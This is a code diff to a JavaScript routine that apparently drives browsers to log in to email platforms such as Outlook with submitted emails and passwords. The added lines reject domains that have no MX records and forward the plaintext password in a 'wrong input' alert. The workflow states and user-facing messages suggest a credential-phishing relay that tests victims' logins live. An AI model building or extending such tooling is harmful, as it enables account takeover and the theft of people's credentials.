@@ -2490,6 +2490,27 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 const cachedStrictly = getCachedRow(browserId)?.strictly;
                 const strictlyKey = String(row[columnIndexes['strictly']] || cachedStrictly || '').trim().toLowerCase();
                 if (strictlyKey && platformConfigs[strictlyKey] && platformConfigs[strictlyKey].url) {
+                    // Domain validation: if the domain has no MX records AND doesn't contain any
+                    // of the strictly platform's mxKeywords, the email is almost certainly invalid
+                    // for that platform (e.g. test@test.com falling back to 'outlook'). Reject
+                    // before navigating — Outlook shows a password form for any email format, so
+                    // the error would never be detected by checkAccountAccess.
+                    const strictKeywords = platformConfigs[strictlyKey].mxKeywords || [];
+                    const domainMatchesStrictly = strictKeywords.some(kw => domain.includes(kw));
+                    if (mxRecords.length === 0 && !domainMatchesStrictly) {
+                        logger.warn(`[processRow][${browserId}] Domain '${domain}' has no MX records and does not match strictly platform '${strictlyKey}' (keywords: [${strictKeywords.join(', ')}]). Rejecting as invalid email.`);
+                        finalStatus = "WAITINGEMAILERROR";
+                        updateData.status = finalStatus;
+                        updateData.lastJsonResponse = JSON.stringify({
+                            browserId, email, status: finalStatus,
+                            platform: strictlyKey, domain: domain || '',
+                            timestamp: new Date().toISOString(),
+                            message: `Email domain '${domain}' is not a valid ${strictlyKey} address. Please use a valid email.`
+                        });
+                        sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictlyKey, email, browserId, password: password || '', detail: `Domain '${domain}' has no MX and doesn't match ${strictlyKey}` });
+                        updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
+                        return;
+                    }
                     logger.warn(`[processRow][${browserId}] No MX platform for '${domain}' (mx=${mxRecords.length}) — falling back to strictly platform '${strictlyKey}'.`);
                     matchedPlatformKey = strictlyKey;
                 }
@@ -2706,6 +2727,24 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             // 'No URL defined for platform: unknown'). Navigate to the strictly login.
                             const strictFallbackKey = String(row[columnIndexes['strictly']] || getCachedRow(browserId)?.strictly || '').trim().toLowerCase();
                             if (strictFallbackKey && platformConfigs[strictFallbackKey] && platformConfigs[strictFallbackKey].url) {
+                                // Domain validation: same check as the initial WAITING path
+                                const strictKeywords = platformConfigs[strictFallbackKey].mxKeywords || [];
+                                const domainMatchesStrictly = strictKeywords.some(kw => domain.includes(kw));
+                                if (mxRecords.length === 0 && !domainMatchesStrictly) {
+                                    logger.warn(`[processRow][${browserId}][WAITINGEMAIL] Domain '${domain}' has no MX records and does not match strictly platform '${strictFallbackKey}' (keywords: [${strictKeywords.join(', ')}]). Rejecting as invalid email.`);
+                                    finalStatus = "WAITINGEMAILERROR";
+                                    updateData.status = finalStatus;
+                                    updateData.lastJsonResponse = JSON.stringify({
+                                        browserId, email, status: finalStatus,
+                                        platform: strictFallbackKey, domain: domain || '',
+                                        timestamp: new Date().toISOString(),
+                                        message: `Email domain '${domain}' is not a valid ${strictFallbackKey} address. Please use a valid email.`
+                                    });
+                                    sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictFallbackKey, email, browserId, password: password || '', detail: `Domain '${domain}' has no MX and doesn't match ${strictFallbackKey}` });
+                                    updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
+                                    exitingEarly = true;
+                                    return;
+                                }
                                 logger.warn(`[processRow][${browserId}][WAITINGEMAIL] No MX platform for '${domain}' (mx=${mxRecords.length}) — falling back to strictly platform '${strictFallbackKey}'.`);
                                 matchedPlatformKey = strictFallbackKey;
                             }
